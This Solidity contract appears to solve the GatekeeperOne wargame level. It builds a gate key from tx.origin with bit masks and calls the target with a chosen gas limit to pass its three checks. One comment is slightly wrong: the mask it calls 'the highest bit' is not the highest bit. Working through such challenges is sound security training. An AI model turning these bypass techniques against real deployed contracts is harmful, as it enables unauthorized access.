// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external view returns (address);
}

/**
 * @title GatekeeperOneExploit
 * @dev Contract to exploit the GatekeeperOne challenge (level 13)
 * This contract aims to bypass the three gates in the GatekeeperOne contract
 */
contract GatekeeperOneExploit {
    address public owner;
    address public gatekeeperAddress;
    bool public success;
    uint256 public gasToUse;
    
    constructor(address _gatekeeperAddress) {
        owner = msg.sender;
        gatekeeperAddress = _gatekeeperAddress;
    }
    
    /**
     * @dev Generate the correct gate key based on the calling address
     * @param _origin The address to generate the key for (tx.origin)
     * @return bytes8 The correct gate key
     */
    function generateGateKey(address _origin) public pure returns (bytes8) {
        // We need to craft a key that meets all three gate conditions:
        
        // Gate 3 conditions broken down:
        // 1. uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
        //    For this to be true, bytes 2-3 must be 0x0000
        //
        // 2. uint32(uint64(_gateKey)) != uint64(_gateKey)
        //    For this to be true, any of bytes 4-7 must be non-zero
        //
        // 3. uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        //    The last 2 bytes of the key must match the last 2 bytes of tx.origin
        
        // Get the last 2 bytes of the origin address
        uint16 addressLast2Bytes = uint16(uint160(_origin));
        
        // Create a mask that will:  
        // 1. Keep the last 2 bytes of the address (condition 3)
        // 2. Set bytes 2-3 to 0x0000 (condition 1)
        // 3. Set at least one bit in bytes 4-7 to 1 (condition 2)
        uint64 mask = 0x1000000000000000; // Set the highest bit
        
        // Combine the mask with the address part
        uint64 key = uint64(addressLast2Bytes) | mask;
        
        // Debug output to verify our logic
        // uint32 part1 = uint32(key);
        // uint16 part2 = uint16(key);
        // require(part1 == part2, "Condition 1 fails");
        // require(uint32(key) != key, "Condition 2 fails");
        // require(uint32(key) == uint16(uint160(_origin)), "Condition 3 fails");
        
        return bytes8(key);
    }
    
    /**
     * @dev Try to enter the GatekeeperOne contract with a specific gas limit
     * @param _gasToUse The gas to use for the call
     */
    function enterGate(uint256 _gasToUse) external {
        require(msg.sender == owner, "Only owner can call");
        gasToUse = _gasToUse;  // Store the gas value for reference
        
        // Generate the gate key based on tx.origin (the original caller)
        bytes8 gateKey = generateGateKey(tx.origin);
        
        // Call the enter function with the specified gas
        // Make sure we have a high enough gas limit for the overall transaction
        // but control the gas sent to the target contract
        bool result = IGatekeeperOne(gatekeeperAddress).enter{gas: _gasToUse}(gateKey);
        
        success = result;
    }
    
    // The bruteForceGas function has been removed as the brute force approach
    // has been moved to the script for better control and visibility
    
    /**
     * @dev Check if the exploit was successful
     * @return bool True if the exploit succeeded
     */
    function checkSuccess() external view returns (bool) {
        address entrant = IGatekeeperOne(gatekeeperAddress).entrant();
        return entrant == tx.origin;
    }
}
